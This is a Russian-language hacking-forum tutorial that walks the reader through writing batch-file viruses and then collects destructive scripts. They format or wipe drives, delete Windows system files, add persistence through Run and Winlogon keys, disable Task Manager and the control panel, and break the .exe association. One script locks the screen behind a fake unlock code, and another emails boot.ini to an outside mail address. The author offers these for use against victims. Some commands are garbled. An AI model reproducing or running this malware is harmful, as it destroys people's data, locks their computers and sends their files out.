[SRC]
Echo_inactive_inactive off {запрещаем вывод на экран исполняемых команд}
copy %0 c:virus.bat >nul {копируем файл; запрещаем вывод на экран самой команды и результата её действия}
echo c:virus.bat>>c:autoexec.bat {добавляем текст в уже существующий файл}
[/SRC]
Вот и все! Проще не бывает! Это пример одного из самых простых bat-вирусов. Хотя с полной уверенностью сказать, что это вирус, значит сказать что заяц ученый. Посмотрите на то, что написано в скобках и вы поймете, что это просто пример того, как сделать основу вируса. Продолжаю:
[SRC]
Echo_inactive_inactive off
copy %0 c:virus.bat >nul
echo c:virus.bat>>c:autoexec.bat
copy %0 a:run.bat >nul {копируем этот файл на дискету, если таковая имеется в дисководе (копирование произойдет при перезагрузке компа)}
[/SRC]

Таким образом к предыдущему исходнику я добавил одну строку и вирус приобрел новую способность: он теперь умеет заражать другие компы через дискету.
[SRC]
Echo_inactive_inactive off
copy %0 c:virus.bat >nul
attrib +h c:virus.bat >nul {устанавливаем файлу virus.bat атрибут «скрытый» (файл virus.bat наверняка попадется человеку на глаза и будет их мозолить , поэтому делаем его скрытым)}
echo c:virus.bat>>c:autoexec.bat
copy %0 a:run.bat >nul
[/SRC]
Вот, наш исходник начинает приобретать очертания вируса!
[SRC]
Echo_inactive_inactive off
if exist c:virus.bat goto ski {проверяем, существует ли файл, …}
copy %0 c:virus.bat >nul
attrib +h c:virus.bat >nul
echo c:virus.bat>>c:autoexec.bat
:ski {…если он существует, то программа переходит на метку :ski}
copy %0 a:run.bat >nul
[/SRC]
Добавил еще одну команду «if exist». Теперь вирус уже будет проверять, есть ли этот файл, и если он есть, то уже не будут выполняться лишние команды. Только скопирует себя на дискету и все.
Теперь модернизируем наш вирус до конца.
[SRC]
Echo_inactive_inactive off%[Meteor]% {выводим на экран текст «Meteor»}

if '%1=='In_ goto Meteo {если переменная %1 равна In, то переходим к метке «:Meteo»}

if exist c:Meteor.bat goto Mete {проверяем, существует ли файл Meteor.bat, если да, то переходим к метке «:Mete»}

if not exist %0 goto Met {если файл не существует, то переходим к метке «Met»}

find "Meteor"c:Meteor.bat {проверяем, есть ли файл meteor на диске, если нет, то копируем его туда}

attrib +h c:Meteor.bat {делаем файл скрытым}

:Mete {метка}

for %%t in (*.bat) do call c:Meteor In_ %%t {выполняем одну команду (call - позволяет вызвать один пакетный файл из другого) для нескольких параметров t} {т.е. вирус находит файл с расширением .bat, и заражает его с помощью команды type, дописывая себя к найденному .bat-файлу}

goto Met {перейти к метке}

:Meteo {метка}

find "Meteor"nul {указываем файлу значение 2 и запрещаем вывод команды и ее результата на экран}

if not errorlevel 1 goto Met {если не произошло ошибки (с кодом 1) выполнения предыдущей команды, то переходим на метку}

type c:Meteor.bat>>%2 {дописываем «себя» к найденному .bat-файлу}

:Met {метка}
[/SRC]
Вот это уже можно назвать более или менее полноценным вирусом!
Для того чтобы вирус стал вирусом, его нужно сохранить с расширением BAT. Жмем «Сохранить как», пишем например virus.bat.
На основе этого исходника можно создавать другие вирусы. Экспериментируйте, модернизируйте, пробуйте написать свой вирус. Скажу к слову, что используя этот исходник, я сделал из него еще три модификации. И это не предел! Возможности не ограничены, все зависит от вашей фантазии.

Приведу еще один простой, но интересный пример:
[SRC]
Echo_inactive_inactive off
Echo format C: /q >> c:Autoexec.bat
[/SRC]

Все! Ничего особенного, да? Этот вирус добавляет в autoexec.bat строку format C: /q и при перезагрузке компа происходит быстрое форматирование диска:)
И вот еще что:
[SRC]
Echo var WSHShell = WScript.CreateObject("WScript.Shell"); > %temp%mes.js
echo WSHShell.Popup ("ПИШИ СЮДА ЧТО УГОДНО"); >> %temp%mes.js
start %temp%mes.js
deltree /y %temp%mes.js
[/SRC]
Добавь этот скрипт в свой вирус, вместо «ПИШИ СЮДА ЧТО УГОДНО» напиши свой текст (например, предсмертную речь для юзера:) ), и при запуске вируса вылезет окошечко с твоим сообщением!
На заметку файл мы сохраняем так Rango-hack ".bat" ← Обязательно.

Еще пару bat кодов )) Вирусов.
Убирает рабочий стол:
[SRC]
Echo_inactive_inactive off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
[/SRC]
Выключается компьютер:
[SRC]
Echo_inactive_inactive off
shutdown -s -t 1 -c "lol" >nul
[/SRC]
Перезагрузка компьютера:
[SRC]
Echo_inactive_inactive off
shutdown -r -t 1 -c "lol" >nul
[/SRC]
Запрещает запускать программы:
[SRC]
Echo_inactive_inactive off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul
[/SRC]
Запрещает заходить в панель управления:
[SRC]
Echo_inactive_inactive off
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer
/v NoControlPanel /t REG_DWORD /d 1 /f >nul
[/SRC]
Серьезные вирусы
Удаляет ВСЕ с раздела\диска(не пытайтесь проверить у себя)
[SRC]
rd [Буква_Диск]: /s /q
Удаляет все файлы в program files
del c:Program Files/q
[/SRC]
Убивает процесс explorer.exe:
[SRC]
taskkill /f /im explorer.exe >nul
[/SRC]
Изменяет расширение всех ярлыков на .txt:
[SRC]
assoc .lnk=.txt
[/SRC]
Заражает Autoexec:
[SRC]
copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\batinit.bat" /f >nul
[/SRC]
Меняет местами кнопки мыши,но обратная смена не возможна)
[SRC]
rundll32 user,SwapMouseButton
[/SRC]
Жестокие вирусы
У вашего кролика будет глючить компьютер.
[SRC]
Echo_inactive_inactive off
echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs
echo do >> %systemdrive%\windows\system32\rundll32.vbs
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs
echo loop >> %systemdrive%\windows\system32\rundll32.vbs

start %systemdrive%\windows\system32\rundll32.vbs

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f
[/SRC]
Вирус который убивает Винду. Не проверяйте на своем компьютере=)
[SRC]
Echo_inactive_inactive This virus created by NickName
Echo_inactive_inactive Virus: forum.ru Virus
Echo_inactive_inactive Autor: NickName
Echo_inactive_inactive off
echo Chr(39)>%temp%\temp1.vbs
echo Chr(39)>%temp%\temp2.vbs
echo on error resume next > %temp%\temp.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs
reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /d 1 /fset ¶§=%0
copy %¶§% %SystemRoot%\user32dll.bat
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
echo fso.deletefile "C:\ntldr",1 >> %temp%\temp.vbs
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f
echo fso.deletefolder "D:\Windows",1 >> %temp%\temp.vbs
echo fso.deletefolder "I:\Windows",1 >> %temp%\temp.vbs
echo fso.deletefolder "C:\Windows",1 >> %temp%\temp.vbs
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs
echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs
echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ru">>%temp%\temp.vbs
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru">>%temp%\temp.vbs
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.whack.ru">>%temp%\temp.vbs
echo on error resume next > %temp%\temp1.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs
echo do>>%temp%\temp1.vbs
echo fso.getfile ("A:\")>>%temp%\temp1.vbs
echo loop>>%temp%\temp1.vbs
echo on error resume next > %temp%\temp2.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs
echo do>>%temp%\temp2.vbs
echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs
echo loop>>%temp%\temp2.vbs
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
echo set application=createobject("shell.application")>>%temp%\temp.vbs
echo application.minimizeall>>%temp%\temp.vbs
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f
start rundll32 user32, SwapMouseButton
reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f
echo i=50 >> %temp%\temp.vbs
echo while i^>0 or i^<0 >> %temp%\temp.vbs
echo S.popup "forum.whack.ru",0, "forum.whack.ru",0+16 >> %temp%\temp.vbs
echo i=i-1 >> %temp%\temp.vbs
echo wend >> %temp%\temp.vbs
echo do >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{capslock}" >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{numlock}" >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs
echo loop>> %temp%\temp.vbs
echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs
echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs
echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs
echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs
echo colCDROMs.Item(i).eject >> %temp%\temp.vbs
echo next >> %temp%\temp.vbs
echo End If >> %temp%\temp.vbs
echo Call SendPost("smtp.mail.ru", "forum.whack.ru@mail.ru", "support@mail.ru", "...", "Копм заражен!") >> %temp%\temp.vbs
echo Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody) >> %temp%\temp.vbs
echo Set iMsg = CreateObject("CDO.Message") >> %temp%\temp.vbs
echo Set iConf = CreateObject("CDO.Configuration") >> %temp%\temp.vbs
echo Set Flds = iConf.Fields >> %temp%\temp.vbs
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 >> %temp%\temp.vbs
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 >> %temp%\temp.vbs
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support" >> %temp%\temp.vbs
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support" >> %temp%\temp.vbs
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru" >> %temp%\temp.vbs
echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25 >> %temp%\temp.vbs
echo Flds.Update >> %temp%\temp.vbs
echo iMsg.Configuration = iConf >> %temp%\temp.vbs
echo iMsg.To = strTo >> %temp%\temp.vbs
echo iMsg.From = strFrom >> %temp%\temp.vbs
echo iMsg.Subject = strSubject >> %temp%\temp.vbs
echo iMsg.TextBody = strBody >> %temp%\temp.vbs
echo iMsg.AddAttachment "c:\boot.ini" >> %temp%\temp.vbs
echo iMsg.Send >> %temp%\temp.vbs
echo End Function >> %temp%\temp.vbs
echo Set iMsg = Nothing >> %temp%\temp.vbs
echo Set iConf = Nothing >> %temp%\temp.vbs
echo Set Flds = Nothing >> %temp%\temp.vbs

echo s.run "shutdown -r -t 0 -c ""pcforumhack.ru"" -f",1 >> %temp%\temp.vbs
start %temp%\temp.vbs
start %temp%\temp1.vbs
start %temp%\temp2.vbs
[/SRC]
Вирус полностью блокирует систему при следующем запуске Windows.Даже в безопасном режиме, выключает диспетчер задач.Чтобы разблокировать компьютер можно введя код 200393!(Но он не разблокирует)
[SRC]
Echo_inactive_inactive off
CHCP 1251
cls
Set Yvaga=На вашем компьютере найден вирус.
Set pass=Пароль
Set pas=Введите пароль.
Set virus=Чтобы разблокировать ПК вам потребуется ввести пароль
Set dim=Выключаю вирус...
title Внимание!!!
CHCP 866
IF EXIST C:\windows\boot.bat (
goto ok )
cls
IF NOT EXIST C:\windows\boot.bat (
ECHO Windows Registry Editor Version 5.00 >> C:\0.reg
ECHO. >> C:\0.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> C:\0.reg
ECHO. >> C:\0.reg
ECHO "Shell"="Explorer.exe, C:\\windows\\boot.bat " >> C:\0.reg
start/wait regedit -s C:\0.reg
del C:\0.reg
ECHO Echo_inactive_inactive off >>C:\windows\boot.bat
ECHO C:\WINDOWS\system32\taskkill.exe /f /im Explorer.exe >>C:\windows\boot.bat
ECHO reg add "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\system" /v DisableTaskMgr /t REG_DWORD /d 1 /f >>C:\windows\boot.bat
ECHO start sys.bat >>C:\windows\boot.bat
attrib +r +a +s +h C:\windows\boot.bat
copy virus.bat c:\windows\sys.bat
attrib +r +a +s +h C:\windows\sys.bat
GOTO end)
:ok
cls
Echo %Yvaga%
echo.
echo %virus%
echo %pas%
set /a choise = 0
set /p choise=%pass%:
if "%choise%" == "101" goto gold
if "%choise%" == "200393" goto status
exit
:status
echo %dim%
attrib -r -a -s -h C:\windows\boot.bat
del C:\windows\boot.bat
attrib -r -a -s -h C:\windows\sys.bat
del C:\windows\sys.bat
cls
:gold
start C:\
:end
[/SRC]
Добавляет программу в автозагрузку ОС:
[SRC]
copy ""%0"" "%SystemRoot%\system32\File.bat"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\File.bat" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
[/SRC]
Этот вирус,блокирует все программы,но интернет работает.
[SRC]
Echo_inactive_inactive off
Echo Virus Loading
Date 13.09.96
If exist c:ski.bat goto abc
Copy %0 c:ski.bat
Attrib +h c:ski.bat
Echo c:ski.bat >>autoexec.bat
:abc
md PRIDUROK
md LUZER
md DURAK
md LAMER
Label E: PRIDUROK
assoc .exe=.mp3
del c:Program Files/q
Echo VIRUS LOAD
[/SRC]
